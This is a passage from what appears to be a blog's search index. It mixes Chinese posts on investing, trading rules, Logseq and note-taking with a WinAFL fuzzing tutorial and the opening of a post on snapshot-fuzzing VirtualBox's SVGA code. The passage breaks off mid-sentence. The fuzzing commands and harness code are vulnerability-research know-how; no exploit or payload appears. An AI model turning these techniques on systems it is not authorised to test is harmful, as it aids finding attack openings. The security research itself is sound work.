感谢布莱恩-阿姆斯特朗、格雷格-布罗克曼、道尔顿-考德威尔、戴安-冯-弗斯滕伯格、麦迪-霍尔、德鲁-休斯顿、维诺德-科斯拉、杰西卡-利文斯顿、乔恩-利维、卢克-迈尔斯（6稿！）、迈克尔-莫里茨、阿里-罗格尼、迈克尔-塞贝尔、彼得-泰尔、特蕾西-杨和希文-齐利斯对本稿的审核，特别感谢拉奇-格罗姆帮助撰写。","link":"/cn/How%20to%20be%20successful/"},{"title":"林园谈投资","text":"看了一个2012年采访林园的视频，每个成功的人士对投资都有自己的看法。 投资最重要的要少犯错 虽然没法预测股票走势，但是股票价格的高低还是需要清楚的，虽然价格低的可能继续走低，价格高的可能继续走高 投机和投资没有本质区别，投机的「机」是择时，价值投资也是择时，市场上的股票供需关系会影响价格 需要知道市场周期，牛熊轮回，不同的市场时期，选择的投资策略也不同 做3到5年的长线投资，关注市场的主线，在龙头股上赚大钱 注重风险管理，投资前测算最差情况，只在有把握时下注，平时不太看盘 使用资产配置来分摊风险，房地产、债券、股票等均有涉猎 每个人都有自己擅长的标的(能力圈)，林园的投资主线是和吃的有关系的消费股 这篇采访出了个彩蛋🎉，主持人问林园平日都有啥爱好。林园说他有两个爱好：1. 逛夜总会 2. 走长路林园逛夜总会的段子已经广泛流传，主持人也接不住这话茬 ：）认真分析 逛夜总会是看高端消费，走长路是看日常消费。一般成功的投资人都有自己独特的指标。","link":"/cn/linyuan_interview/"},{"title":"Logseq 使用小结 （三）","text":"使用 Logseq 写笔记已经大半年了，Logseq 是这么多年来除了 vim 之外，唯一可以在使用上螺旋上升的软件。我把 Logseq 推荐给媳妇，她用来写会议纪要，写备忘录，管理待办事项，也用得挺好。 Logseq 的成功之处在于它降低了记录的成本，不需要大段大段的文字，也不需要太多的文章结构，随时都可以记录。Logseq 比较严重的问题是它的使用太灵活了，前后记录的标准、格式、标签等要素可能不一致，容易造成笔记凌乱。笔记一凌乱就没法有效的聚合，笔记的有效聚合形成一个有意义的想法群是 Logseq 等双链软件和其他笔记软件相比最有价值的地方。 我这半年来总结出笔记系统成功的关键是： 在同一个地方，用同样的格式和一致的标准记录你的洞见。但是由于 Logseq 缺乏有效的工作流，没法自动化提示必要的步骤，只能通过不断的练习来强化学习。另外 Logseq 中 page 和 tag 只是起到过滤笔记的作用，最关键的笔记之间的链接却很容易被忽视，tag 的数量一多又会开始笔记凌乱了。 总而言之，如果只是把 Logseq 作为备忘，或者简单作为信息记录，挺好用也不需要学习太多的东西，但是如果需要使用 Logseq 来实践卡片笔记法等 PKM 理论，恐怕还是需要花费一些功夫仔细琢磨一番。PKM 方面的书籍我强力推荐 《卡片笔记写作法》一书，中文翻译很不错，虽然书名是谈写作，里面的内容却涉及很广，我自己阅读后收益良多。 就实践卡片笔记法来说，浮墨是一个比较理想的工具，「少即是多，多则惑」，去掉一切不需要的功能，重点才能突出。Logseq 的野心挺大，不想只做一个双链笔记本，还想做得更多，这就要求我们想清楚使用其的主要目的是什么。现实中并不存在一个 all in one 的理想工具，什么工具合适就可以使用什么工具，各位施主不能 「着相」了。 上面说的是一些「道」层面的东西， Logseq 在「术」方面的东西也不少，下面将介绍一些前两篇尚未涉及的功能和使用技巧。 ☆ 使用 propertieshttps://docs.logseq.com/#/page/term%2Fproperties 在 Logseq 中有两种 properties， page properties 和 block properties。 Page properties 在第一个 block 写 property:: value Block properties 在每个 block 内使用 property:: value 在使用 block properties 时，需要输入 shift + Enter 来进行换行，换行后输入 :: Logseq 会自动提示已经使用过的 property。理解 properties 可以简单的把 block 看成数据库的一条记录， properties 就是不同的字段，可以通过 Logseq 的 query 来查询相关记录。在使用 properties 时可以引用 page 或者 tag，可以通过这种方法来索引这条记录。 例如，我将书籍的 block 都添加了 category:: Books 的属性，后续可以使用 {{query (property category Books) }} 来查询所有书籍了，感觉上有点类似 notion 的表格。 ☆ 使用 /Scheduled 制定计划使用 Schedule 的功能的方法比较简单，在写完一条 block 后，输入 shift + enter 换行后，输入 /Scheduled 在弹出的界面中选择时间周期即可。 在 Schedule 规定的时间内，Logseq 的 Journals 页面可以看到相关的内容。 ☆ 使用模板 （Template）https://docs.logseq.com/#/page/templates 使用模板的好处是可以避免重复性的劳动，比如你希望在 Journals 页面里按照 [[每日工作]] [[每日心得]] 的固定格式来记录，那么你需要在每天重复输入一次。但如果你制作一个固定模板，就可以使用 /Template 命令来完成自动化的输入。 制作模板的过程可以参考 Logseq 官方的动画，简单说就是写一个 block，这个 block 包含了必要的结构，在 block 前面的圆点点击鼠标右键 -&gt; Make template，再输入模板的名字就完成了。在后续的使用过程中，输入 /Template 后在弹出的界面选择对应的模板名就可以完成自动化的输入。 ☆ 一些好用的插件插件可以拓展 Logseq 的功能，使用插件的方法在 Logseq 使用小结 （二） 中有详细介绍，这里就不再细说。 Logseq Plugin Tabshttps://github.com/pengx17/logseq-plugin-tabs Plugin Tabs 像打开浏览器一样打开 pages 或者 blocks，对于内容比较多的 page，这个插件非常实用。 logseq-plugin-mark-maphttps://github.com/vipzhicheng/logseq-plugin-mark-map Mark map 可以自动化地把你的笔记用导图的形式输出，方便展示和记忆。 ☆ 一些使用上的小技巧 Logseq content wide mode 可以使用快捷键切换 t w Logseq 的 property 可以通过输入 :: 来触发自动补全操作，非常方便。 Logseq 使用快捷键 Cmd + Shift + i 可以打开 devtools Logseq v0.68，自动补全提供两个快捷键 mod+p 和 mod+n 比较方便了 Logseq 可以使用 command + 和 command - 来放大或者缩小 Logseq 的字体大小 Logseq 0.7.1 新功能：Copy &amp; Paste with rich-text formats，如果粘贴时不想保留格式 mod + shift + v Logseq 移动光标的快捷键：mod + p 向上移动光标，mod + n 向下移动光标 Logseq Markdown 语法支持 Horizontal Rules，可以使用 ---分隔卡片笔记。 mod 在 windows 和 linux 系统中是 ctrl， 在 macOS 系统中是 command ☆ 参考链接https://www.usmacd.com/cn/logseq/https://www.usmacd.com/cn/logseq2/","link":"/cn/logseq3/"},{"title":"关于笔记的一些思考","text":"Random Notes (漫游笔记) 的技术原理是用新视角去审视旧想法，和自己以前的想法不期而遇的感觉非常奇妙。总体来说人是会不断进步的，经过一段时间后再去重温自己某个时刻的想法，可能以前的一些疑惑现在已经没有了，也可能对某个问题有了更进一步的思路，这是促使想法迭代的一种方法。 想要做到想法的自然迭代，必要的条件是可以马上回到过去的某个时刻，而且那个时刻的上下文没有丢失，如果上下文丢失意味着已经看不懂以前的笔记了，自然也就没有了迭代的可能性。 卡片盒笔记法要求用完整的句子精要简述想法，笔记之间的连接则补充了上下文，为想法迭代创造了有利条件。 写永久笔记时，应该假设读者对文本背后的思想，原文背景一无所知，只具备相关的领域知识。这里的读者其实也包括未来的自己，我们写下永久笔记后，很快就会将其的上下文遗忘，就想从没有见过该笔记的其他读者一样。 我们应该寻找与我们观点相反的论点或者事实来挑战我们的既有思维，但是受「确认偏差」的影响，我们会不经意的忽略这些信息，那些和我们观点一致的信息有很大吸引力，因为这些信息可以证明自己很博学。解决 「确认偏差」的方法：把寻找证实性信息变为收集所有信息，不需要关注这些信息支持的具体观点。 我们使用卡片盒笔记法，对习惯最重要的转变是将注意力从个别项目的预设立场变成思考笔记之间的开放性联系。通过一段时间的训练，在阅读过程中我们可以轻松找出与预设观点相悖的信息。当这些信息改变我们对某些问题的看法时，我们会感到相当兴奋，从而慢慢喜欢上这种感觉。 在实践卡片笔记法的过程中，会遇上一整天都没写一张卡片的时候，而有的时候则一天写十多张卡片。限制每天写笔记的数量可以让写卡片盒笔记的过程更加轻松，避免了过于放松的状态，也避免了过于紧绷的状态，有利于我们保持良好的状态。另一个好处则是让你选择笔记内容时更加挑剔，有利于提高笔记的质量。 你可以将目标设置为每天写3条笔记，或者每年出一本书，仍然可以在合理的时间内积累大量的想法。 卡片笔记法属于自下而上的发散思维，发散思维有个问题，就是无法把握发散的度。为了应对这个问题，卢曼提出的办法是仔细思考笔记之间的联系，写笔记时参考文献笔记和自己以前写的笔记，定期自上而下制作索引卡片，这些做法的目的是避免想法过于太发散。 思维需要发散，但是领域需要聚焦，我们在自己的专业，财务等领域是需要不断精进的，这两个方面似乎是矛盾的。有人建议使用分类法，把关注的领域分类，在日常工作学习中不断完善，但这种方法很容易回到资料归档的老路。 最近的研究发现可以使用 P.A.R.A. 来组织顶层结构，统领需要精进的领域，在具体想法的记录上则继续使用卡片笔记法。这种方法使用 P.A.R.A. 不断推动自己在关注领域的取得进展，又能在关键的思考上使用卡片笔记法，自用一段时间感觉不错。 关于笔记管理存在几个误区a) 笔记软件/博客系统，我先后使用过 EverNote，WizNote，VNote，CSDN blog，Google blogspot, WordPressb) 笔记格式，我先后使用过 txt, orgmode, markdown 其实这些都不是关键，除了折腾还是折腾。以前我常说一个段子，你以为你在写博客，其实你在折腾 Wordpress 插件c) 各种笔记软件，博客系统，笔记格式的切换都会带来信息丢失。信息丢失容易造成心理负担 我以前认为笔记杂乱的原因是是笔记缺乏组织结构，实践结果表明良好的分类确实有一定帮助，但是不是最重要的。最重要的是在同一个地方，用同样的格式和一致的标准记录你的洞见。 把笔记保存在同一个地方避免了笔记分散，迁移也比较方便。同样的格式和一致的标准则为笔记之间的联系与聚合创造了有利条件。如果笔记之间格式不一致，粒度不一致，不容易产生新的想法。另外，当我们以一致的标准写笔记时阻力是最小的，关注的是笔记的内容，形式等外在的东西则变得不再重要。 新的观点、新的洞见、新的想法，是笔记系统中最有价值的东西。笔记系统应该侧重于知识的积累而不是信息的积累。 闪念笔记的处理细节a) 造成不理想笔记系统的原因是各种不同类型的笔记 「混杂」，真正有想法有见解的笔记被淹没在一大堆无用的闪念笔记中。b) 闪念笔记只有你在一两天内回顾它把它转化为可以使用的笔记才能有价值。c) 我们每天大多数的想法没有太大意义应该被丢弃，而那些可以成为重大有意义的想法我们必须将他们识别出来。d) 卢曼的卡片盒里只有文献笔记和永久笔记，就是说大部分的闪念笔记实际上被丢弃了 传统笔记系统的三种典型错误a) 把每条笔记都当成“永久笔记”，将导致好的笔记和特定项目笔记或者不那么好的笔记混杂，无法形成群聚效应b) 只记录特定项目相关的笔记，将导致项目期间有趣的观点或者想法信息丢失。如果使用新建项目的方法来记录，则会导致大量未完成的项目，影响我们的信心。c) 把所有的笔记当作闪念笔记，将导致自己陷入大量堆积的杂乱笔记中并且总是产生清理笔记的冲动d) 闪念笔记用于快速捕捉一瞬间的灵感，但只有你在一两天内回顾它并把它变成可以使用的(和其他笔记链接)合适的笔记才有意义 现在发现没有记录基本就等于没有学习，不论记性多好都会随着年龄的增大而逐渐忘记，所以不断记录，不断总结，不断分析，才能螺旋前进。在得到听了很多课程，基本上能记住的不多，最终能用上的可能还是记录下来的一些东西。某位技术大佬说：「若自己写的技术文档三个月之后乃至更长时间跨度，不能指导自己的相关工作，该文档严重不合格。该标准很靠谱，诸君可自行检验。」 未完，待续 …","link":"/cn/note/"},{"title":"专业投机原理中的技术分析法则摘要","text":"有关金融市场方面的书我个人的图书馆里至少有1200本。它们主要是讨论证券分析、期权策略、期货策略、技术分析以及其他相关方面的书。这些书大多都包含相当不错的构想，其中约2%是真正优秀的作品。然而，它们大多存在一个共同的问题：试图推销一种“战胜市场”的方法，很多方法甚至没有经过实际市场的完整测试。 如何正确的绘制趋势线使用以下方法绘制趋势线可以提供一致而精确的结果，而且绝对不会产生错误的信号： 选择考虑的时间：长期（数月至数年）、中期（数个星期至数月）或短期（数天至数个星期）。 上升趋势线：在考虑的时间内，以最低的低点为起点，向右上方绘制一条直线，连接最高点前的某一个低点，使这条直线在两个低点之间未穿越任何价位。延伸这条直线而经过最高点（这是指水平轴上的位置而言）。趋势线经过所考虑的最高点以后，它可能穿越某些价位。事实上，这是趋势发生变化的一种现象。 下降趋势线：在考虑的时间内，以最高的高点为起点，向右下方绘制一条直线，连接最低点前的某一个高点，而使这条直线在两个高点之间未穿越任何价位。延伸这条直线而经过最低点。 这个方法的优点在于其明确性，并可以用来判断趋势是否可能变动或已经变动。 确立趋势变动的 123 法则 股价突破趋势线 上升趋势回档后，不创新高；下降趋势反弹后，不创新低 上升趋势跌破上一个回档低点，下降趋势突破上一个反弹高点 风险报酬比很不错的 2B法则上升趋势中价格创新高后，并未持续上涨，而后又跌破先前的高点，则趋势很可能反转。 具有统计学优势的四天准则在中期走势中，当市场在高点或者低点以连续四天下跌或上涨的走势而呈反转时，趋势可能发生变化。 （和趋势方向相反的连续四根K线） 四天准则辅助准则当中期走势发展到相当程度以后，如果出现顺势的四天（或者以上）排列，随后出现第一天的逆趋势行情，经常代表趋势变动的顶部或者底部。 三天高低价准则三天的高低价准则，是运用最近三天的盘中高价与低价。当价格发生反转而穿越三天的高价或低价时，则做多或卖空，并以第三天的低价或高价作为止损点。 这个准则必须配合另一个确认原则。 缺口准则缺口准则很简单，当趋势线上方或者下方出现缺口时，它反映重大变化（消息面或基本面），并显示趋势可能发生变动。该准则并不需要2B，也不需要经过试探（趋势线）。然而，缺口必须穿越趋势线，该准则才有效。 这个准则必须配合另一个确认原则。","link":"/cn/trader_vic/"},{"title":"winafl fuzz 工具的使用","text":"0. 下载 Visual Studio Community 2022下载地址：https://aka.ms/vs/17/release/vs_community.exe 从微软网站下载并安装 Visual Studio Community 的时候速度只有2 K，一下午没能下载成功。咨询同事小钻风，指出可能是 DNS 问题，将 DNS 切换成阿里的 DNS 223.5.5.5 后下载速度达到 4 M。中国开发者网络总是个问题，大家都挺不容易的。 1. 编译 winafl 下载 DynamoRIO 解压到 D:\\DynamoRIO 下载 cmake 解压到 D:\\cmake 从 Github 下载 winafl 编译 intel PT 需要同步 third_party 的源码 123git clone https://github.com/googleprojectzero/winafl.gitcd winaflgit submodule update --init --recursive 从菜单中选择 X64 native tool command prompt for VS 2022，执行编译命令 1234mkdir build64cd build64D:\\cmake\\bin\\cmake.exe -G&quot;Visual Studio 17 2022&quot; -A x64 .. -DDynamoRIO_DIR=D:\\DynamoRIO\\cmake -DINTELPT=1D:\\cmake\\bin\\cmake.exe --build . --config Release -DINTelPT=1 参数将编译 Intel PT 模式的支持，编译完成后，可以正常运行 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051.\\build64\\bin\\Release&gt;.\\afl-fuzz.exeWinAFL 1.16b by &lt;ifratric@google.com&gt;Based on AFL 2.43b by &lt;lcamtuf@google.com&gt;.\\afl-fuzz.exe [ afl options ] -- [instrumentation options] -- \\path\\to\\fuzzed_app [ ... ]Required parameters: -i dir - input directory with test cases -o dir - output directory for fuzzer findings -t msec - timeout for each runInstrumentation type: -D dir - directory with DynamoRIO binaries (drrun, drconfig) -w winafl - Path to winafl.dll -P - use Intel PT tracing mode -Y - enable the static instrumentation modeExecution control settings: -f file - location read by the fuzzed program (stdin) -m limit - memory limit for the target process -p - persist DynamoRIO cache across target process restarts -c cpu - the CPU to run the fuzzed programFuzzing behavior settings: -d - quick &amp; dirty mode (skips deterministic steps) -n - fuzz without instrumentation (dumb mode) -x dir - optional fuzzer dictionary (see README)Other stuff: -I msec - timeout for process initialization and first run -T text - text banner to show on the screen -M \\ -S id - distributed mode (see parallel_fuzzing.txt) -C - crash exploration mode (the peruvian rabbit thing) -e - expert mode to run WinAFL as a DynamoRIO tool -l path - a path to user-defined DLL for custom test cases processing -V - show version number and exitAttach: -A module - attach to the process that loaded the provided moduleFor additional tips, please consult afl_docs\\README.C:\\Users\\zhouzhen\\Downloads\\winafl\\build64\\bin\\Release&gt; 2. 检查 DynamoRIO 模式是否正常工作使用 IDA Pro 对 test_gdiplus.exe 进行反汇编，target_offset 为 0x10E0 123.text:00000001400010E0 ; int __cdecl main(int argc, const char **argv, const char **envp).text:00000001400010E0 main proc near ; CODE XREF: __scrt_common_main_seh(void)+107↓p.text:00000001400010E0 ; DATA XREF: .rdata:0000000140002B6C↓o ... 先用 drrun.exe 测试 winafl 是否正常工作，其实就是循环执行 10 次目标程序。 123D:\\DynamoRIO\\bin64\\drrun.exe -c winafl.dll -debug ^-target_module test_gdiplus.exe -target_offset 0x10E0 -fuzz_iterations 10 ^-nargs 2 -- test_gdiplus.exe input.bmp 执行命令后，在当前目录下会生成一个 log 文件，文件名为 afl.test_gdiplus.exe.14172.0000.proc.log，内容如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152Module loaded, dynamorio.dllModule loaded, winafl.dllModule loaded, drx.dllModule loaded, drreg.dllModule loaded, drmgr.dllModule loaded, drwrap.dllModule loaded, test_gdiplus.exeModule loaded, gdiplus.dllModule loaded, VCRUNTIME140.dllModule loaded, msvcp_win.dllModule loaded, win32u.dllModule loaded, ucrtbase.dllModule loaded, KERNELBASE.dllModule loaded, gdi32full.dllModule loaded, KERNEL32.dllModule loaded, msvcrt.dllModule loaded, IMM32.dllModule loaded, RPCRT4.dllModule loaded, GDI32.dllModule loaded, combase.dllModule loaded, USER32.dllModule loaded, ntdll.dllIn pre_fuzz_handlerModule loaded, UxTheme.dllModule loaded, OLEAUT32.dllModule loaded, bcrypt.dllModule loaded, SECHOST.dllModule loaded, ADVAPI32.dllModule loaded, WindowsCodecs.dllModule loaded, MSCTF.dllIn post_fuzz_handlerIn pre_fuzz_handlerIn post_fuzz_handlerIn pre_fuzz_handlerIn post_fuzz_handlerIn pre_fuzz_handlerIn post_fuzz_handlerIn pre_fuzz_handlerIn post_fuzz_handlerIn pre_fuzz_handlerIn post_fuzz_handlerIn pre_fuzz_handlerIn post_fuzz_handlerIn pre_fuzz_handlerIn post_fuzz_handlerIn pre_fuzz_handlerIn post_fuzz_handlerIn pre_fuzz_handlerIn post_fuzz_handlerEverything appears to be running normally.Coverage map follows: Everything appears to be running normally. 表明 winafl 自己认为没有出错。 log 文件中还包含了其他有用信息，比如说目标程序加载的模块。这些加载的模块可以用来设置 -coverage_module来统计你所关注的 coverage。 使用 drrun.exe 验证成功后，可以执行下面命令测试 winafl 是否正常工作。 123afl-fuzz.exe -i in -o out -D D:\\DynamoRIO\\bin64 -t 20000 ^-- -coverage_module gdiplus.dll -coverage_module WindowsCodecs.dll -fuzz_iterations 5000 ^-target_module test_gdiplus.exe -target_offset 0x10E0 -nargs 2 -- test_gdiplus.exe @@ 执行后上面的命令后，如果发现 total paths 的数字在不断变化， winafl 就已经可以正常工作了，恭喜 😄 12345678910111213141516171819202122+- process timing -------------------------------------+- overall results ----+| run time : 0 days, 0 hrs, 0 min, 1 sec | cycles done : 0 || last new path : 0 days, 0 hrs, 0 min, 1 sec | total paths : 2 || last uniq crash : none seen yet | uniq crashes : 0 || last uniq hang : none seen yet | uniq hangs : 0 |+- cycle progress --------------------+- map coverage -+----------------------+| now processing : 0 (0.00%) | map density : 1.65% / 1.65% || paths timed out : 0 (0.00%) | count coverage : 1.00 bits/tuple |+- stage progress --------------------+ findings in depth --------------------+| now trying : arith 8\\8 | favored paths : 1 (50.00%) || stage execs : 388/389 (99.74%) | new edges on : 2 (100.00%) || total execs : 619 | total crashes : 0 (0 unique) || exec speed : 353.3/sec | total tmouts : 0 (0 unique) |+- fuzzing strategy yields -----------+---------------+- path geometry -------+| bit flips : 0/56, 1/55, 0/53 | levels : 2 || byte flips : 0/7, 0/6, 0/4 | pending : 2 || arithmetics : 0/0, 0/0, 0/0 | pend fav : 1 || known ints : 0/0, 0/0, 0/0 | own finds : 1 || dictionary : 0/0, 0/0, 0/0 | imported : n/a || havoc : 0/0, 0/0 | stability : 99.63% || trim : 0.00%/1, 0.00% +-----------------------+^C----------------------------------------------------+ [cpu000001: 14%] 3. DynamoRIO 模式 winafl.dll 各个参数的具体含义winafl.dll 是 DynamoRIO client (instrumentation) code，参数挺多 Winafl 的 README 中介绍了下面这些参数。 12345678910111213141516171819202122232425262728293031323334353637383940-covtype - the type of coverage being recorded. Supported options are bb (basic block, default) or edge.-coverage_module - module for which to record coverage. Multiple module flags are supported.-target_module - module which contains the target function to be fuzzed. Either -target_method or -target_offset need to be specified together with this option.-target_method - name of the method to fuzz in persistent mode. For this to work either the method needs to be exported or the symbols for target_module need to be available. Otherwise use -target_offset instead.-target_offset - offset of the method to fuzz from the start of the module.-fuzz_iterations - Maximum number of iterations for the target function to run before restarting the target process.-nargs - Number of arguments the fuzzed method takes. This is used to save/restore the arguments between runs.-call_convention - The default calling convention is cdecl on 32-bit x86 platforms and Microsoft x64 for Visual Studio 64-bit applications. Possible values: * fastcall: fastcall * ms64: Microsoft x64 (Visual Studio) * stdcall: cdecl or stdcall * thiscall: thiscall-debug - Debug mode. Does not try to connect to the server. Outputs a log file containing loaded modules, opened files and coverage information.-logdir - specifies in which directory the log file will be written (only to be used with -debug).-thread_coverage - If set, WinAFL will only collect coverage from a thread that executed the target function -nargs target method 或者 target offset 的参数个数 -fuzz_iterations 重启进程前，循环执行 target method 或者 target offset 的次数 -target_moudle fuzz 的目标模块，需要和 target method 或者 target offset 一起使用 -target_method persistent mode 下 fuzz 的函数名（方法名），需要有符号 （symbols） -target_offset fuzz 的函数（方法）相对于模块起始地址的偏移 -coverage_module 统计覆盖率的模块，可以统计多个模块的 coverage，即指定多个 -coverage_module 参数 -covtype bb 或者 edge，bb （basic block 为默认值） -thread_coverage 用于多线程程序，只统计一个线程执行 target function 的覆盖率变化 4. WinAFL intel PT 模式使用Intel PT (Processor Tracing) 是 Intel CPU 的一个特性，从 Intel 第5代处理器开始支持，5th generation 的微架构为 Broadwell。相关说明可以参考：https://www.intel.com/content/www/us/en/support/articles/000056730/processors.html Windows 10 从 v1809 开始提供了 Intel PT 的驱动，但目前没有公开的文档描述此驱动，也没有提供官方的 API。 Alex Ionescu 提供了 winipt library 和 Intel PT 驱动交互，WinAFL 利用 winipt 来获得 Intel PT 的 Processo Tracing 信息。 WinAFL 使用 Intel PT 模式，和 DynamoRIO 不同需要指定 -P , WinAFL Intel PT 模式除了和DynamoRIO 相同的参数外额外添加了下面几个参数： -trace_size 每次执行 traget 手机的 trace 信息的字节数，必须是2 的次方并且大于 4096 -decode 处理 trace 信息的解码器，有三个可选值：tip, tip_ref 和 full (full 为默认值) -nopersistent_trace 由于性能的缘故，WinAFL 每次循环执行 target 是不重启程序，这个选项可以强制 WinAFL 每次执行 target 都重启，一般是为了调试才会启用这个选项 -trace_cache_size trace 信息的 cache 字节数，和 full 解码器一起使用 5. 检查 Intel PT 模式是否正常工作12winaflpt-debug.exe -debug -coverage_module gdipluss.dll -coverage_module WindowsCodecs.dll ^-fuzz_iterations 10 -target_module test_gdiplus.exe -target_offset 0x10E0 -nargs 2 -- test_gdiplus.exe @@ 上面命令其实和检查 DynamoRIO 模式是否正常工作的命令基本一致，执行命令后输出如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243Module loaded: test_gdiplus.exeModule loaded: ntdll.dllModule loaded: KERNEL32.DLjLModule loaded: KERNELBASE.dllModule loaded: ucrtbase.dllModule loaded: gdiplus.dllModule loaded: msvcrt.dllModule loaded: combase.dllModule loaded: VCRUNTIME140.dllModule loaded: RPCRT4.dllModule loaded: USER32.dllModule loaded: win32u.dllModule loaded: GDI32.dllModule loaded: gdi32full.dllModule loaded: msvcp_win.dllModule loaded: IMM32.DLLiteration 0Module loaded: uxtheme.dllModule loaded: msctf.dllModule loaded: oleaut32.dllModule loaded: sechost.dllIteration finished normallyiteration 1Iteration finished normallyiteration 2Iteration finished normallyiteration 3Iteration finished normallyiteration 4Iteration finished normallyiteration 5Iteration finished normallyiteration 6Iteration finished normallyiteration 7Iteration finished normallyiteration 8Iteration finished normallyiteration 9Iteration finished normallyCoverage map (hex): 0000000000000000000000000000000000000000000000000000000000000000 6. 用 Intel PT 模式 fuzz123afl-fuzz.exe -i in -o out -P -t 20000 -- -coverage_module gdiplus.dll ^-coverage_module WindowsCodecs.dll -fuzz_iterations 5000 ^-target_module test_gdiplus.exe -target_offset 0x10E0 -nargs 2 -- test_gdiplus.exe @@ 用上面的命令调用 afl-fuzz，发现可以正常工作，界面如下： 12345678910111213141516171819202122232425 WinAFL 1.16b based on AFL 2.43b (test_gdiplus.exe)+- process timing -------------------------------------+- overall results ----+| run time : 0 days, 0 hrs, 0 min, 15 sec | cycles done : 0 || last new path : 0 days, 0 hrs, 0 min, 1 sec | total paths : 9 || last uniq crash : none seen yet | uniq crashes : 0 || last uniq hang : none seen yet | uniq hangs : 0 |+- cycle progress --------------------+- map coverage -+----------------------+| now processing : 0 (0.00%) | map density : 1.50% / 3.67% || paths timed out : 0 (0.00%) | count coverage : 1.40 bits/tuple |+- stage progress --------------------+ findings in depth --------------------+| now trying : havoc | favored paths : 1 (11.11%) || stage execs : 2332/8192 (28.47%) | new edges on : 5 (55.56%) || total execs : 3350 | total crashes : 0 (0 unique) || exec speed : 221.4/sec | total tmouts : 0 (0 unique) |+- fuzzing strategy yields -----------+---------------+- path geometry -------+| bit flips : 0/48, 0/47, 1/45 | levels : 2 || byte flips : 0/6, 0/5, 0/3 | pending : 9 || arithmetics : 1/335, 0/75, 0/0 | pend fav : 1 || known ints : 0/28, 1/168, 1/120 | own finds : 8 || dictionary : 0/0, 0/0, 0/0 | imported : n/a || havoc : 0/0, 0/0 | stability : 65.28% || trim : 0.00%/1, 0.00% +-----------------------++-----------------------------------------------------+ [cpu000001: 23%] 7. Winafl 的多核使用情况执行 Winafl 的 PT 模式，使用任务管理器 -&gt; 打开资源监视器 -&gt; CPU 可以观察到只有一个 CPU core 跑满 100% 参考资料https://github.com/googleprojectzero/winafl/blob/master/README.mdhttps://github.com/googleprojectzero/winafl/blob/master/readme_dr.mdhttps://github.com/googleprojectzero/winafl/blob/master/readme_pt.md","link":"/cn/winafl/"},{"title":"When Hypervisor Met Snapshot Fuzzing","text":"source: https://null2root.github.io/blog/2022/07/21/When-Hypervisor-Met-Snapshot-Fuzzing.html 1. IntroductionHypervisor was known as hard target to fuzz over several years. Even though, lots of prior pioneers( Peter Hlavaty, Chaitin Tech, StarLabs, Peleg Hadar and Ophir Harpaz and many others ) doing amazing work to overcome this limit and found interesting bugs. But it is not an easy topic for some fresh newbie like me to starts from the bottom. I think manual code( or binary ) auditing and static analysis could be only considerable options if I start my research a few years ago without What The Fuzz. What The Fuzz( a.k.a WTF ) is a snapshot-based fuzzer targeting Windows Ring-3 and Ring-0 component. WTF’s snapshot is based on memory dump both kernel and user-land. Because of that, WTF can not emulate any functionality which requires anything not within in-memory and can not create new process or thread because memory dump limited on single process. But WTF support breakpoint Handler which you can set breakpoint on any address within memory dump and if fuzz execution reaches that address, pre-defined breakpoint handler will be executed. Based on this, we can trying to overcome some limitation on WTF such as file access. I really love WTF’s flexibility and its potential, and I am going to show one of example usage of WTF on targeting Virtualbox to prove how awesome it is. 2. Developing Fuzz ModuleFirst, you should define your own fuzz module for your target. There are few examples on github( fuzzer_hevd.cc, fuzzer_tlv_server.cc ) and blog post( ret2systems, Doar-e ). My Target was Virtualbox’s SVGA component. SVGA is something like “JavaScript of hypervisors“. Because of its complex nature, many hypervisor bugs are oriented by SVGA. And that’s the reason why I choose it as a first target. VirtualBox have a function called vmsvgaR3FifoLoop. It waits until guest submit new command data through GPA. So this is a good spot( or should I call it source? ) to take a snapshot. I set a breakpoint on vmsvgaR3FifoLoop+4E2 to take snapshot. It is same position as here, start of switch-case routine for SVGA and SVGA3D command. After creating snapshot, I had to decide make it run multiple times in single execution or not. Because SVGA is consist of various commands like define, update, delete something…, I thought fuzz campaign must handle multiple SVGA commands during single round. First, I had to define structure to contains multiple testcases. Luckily, 0vercl0k already write nice example to doing that. So I did same thing as below. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#define SVGA_CMD_BODY_MAX 0xA000const uint32_t SvgaCmdList[] = {1, 3, 19, 22, 25, 29, 30, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 1040, 1041, 1042, 1043, 1044, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081};const uint32_t SvgaCmdListLen = 58;struct SvgaCmd_t { uint32_t SvgaCmdCode; std::vector&lt;uint8_t&gt; SvgaBody; NLOHMANN_DEFINE_TYPE_INTRUSIVE(SvgaCmd_t, SvgaCmdCode, SvgaBody);};struct SvgaCmds_t { std::vector&lt;SvgaCmd_t&gt; SvgaCmds; NLOHMANN_DEFINE_TYPE_INTRUSIVE(SvgaCmds_t, SvgaCmds);};struct { std::deque&lt;SvgaCmd_t&gt; SvgaCmds; CpuState_t Context; uint8_t SvgaCmdBody[SVGA_CMD_BODY_MAX]; uint32_t SvgaCmdBodySize; void RestoreGprs(Backend_t *B) { const auto &amp;C = Context; B-&gt;Rsp(C.Rsp); B-&gt;Rip(C.Rip); B-&gt;Rax(C.Rax); B-&gt;Rbx(C.Rbx); B-&gt;Rcx(C.Rcx); B-&gt;Rdx(C.Rdx); B-&gt;Rsi(C.Rsi); B-&gt;Rdi(C.Rdi); B-&gt;R8(C.R8); B-&gt;R9(C.R9); B-&gt;R10(C.R10); B-&gt;R11(C.R11); B-&gt;R12(C.R12); B-&gt;R13(C.R13); B-&gt;R14(C.R14); B-&gt;R15(C.R15); }} GlobalState;SvgaCmds_t Deserialize(const uint8_t *Buffer, const size_t BufferSize) { const auto &amp;Root = json::json::parse(Buffer, Buffer + BufferSize); return Root.get&lt;SvgaCmds_t&gt;();}bool InsertTestcase(const uint8_t *Buffer, const size_t BufferSize) { GlobalState.SvgaCmds.clear(); const auto &amp;Root = Deserialize(Buffer, BufferSize); for(auto SvgaCmd : Root.SvgaCmds) { GlobalState.SvgaCmds.emplace_back(std::move(SvgaCmd)); } return true;} It is almost identical as example. Next question was, how can I insert data into snapshot? I had to find a insertion point and proper memory address. Luckily( again ), VirtualBox using a function called 